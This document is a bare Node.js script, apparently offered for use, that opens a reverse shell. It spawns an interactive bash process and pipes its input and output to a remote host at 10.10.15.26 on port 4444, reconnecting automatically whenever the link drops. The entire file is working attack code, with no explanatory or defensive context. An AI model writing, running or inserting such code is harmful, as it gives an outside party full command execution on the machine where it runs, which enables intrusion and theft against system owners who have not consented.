var spawn = require('child_process').spawn;
var net = require('net');
var reconnect = require('reconnect');

reconnect(function (stream) {
    var ps = spawn('bash', [ '-i' ]);
    stream.pipe(ps.stdin);
    ps.stdout.pipe(stream, { end: false });
    ps.stderr.pipe(stream, { end: false });
    ps.on('exit', function () { stream.end() });
}).connect(4444, '10.10.15.26');
